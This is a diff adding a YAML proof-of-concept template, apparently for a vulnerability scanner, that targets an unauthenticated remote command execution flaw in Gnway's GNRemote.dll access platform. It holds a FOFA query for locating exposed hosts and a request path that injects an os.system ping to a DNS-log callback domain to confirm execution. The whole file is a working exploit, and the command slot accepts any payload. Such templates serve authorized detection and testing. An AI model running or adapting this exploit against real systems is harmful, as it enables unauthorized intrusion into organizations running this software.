@@ -1,0 +1,17 @@
+id: poc-yaml-gnway-gnremote-pyargu-rce
+info:
+  name: 金万维-云联应用系统接入平台GNRemote.dll前台RCE漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 命令注入
+  finger: 云联应用系统接入平台
+  fofa: title="云联应用系统接入平台"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: GET
+  path: /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=ping+-nc+2+{{.reverseDomain}}
+  expression: reverse.Verify()
+transport: http
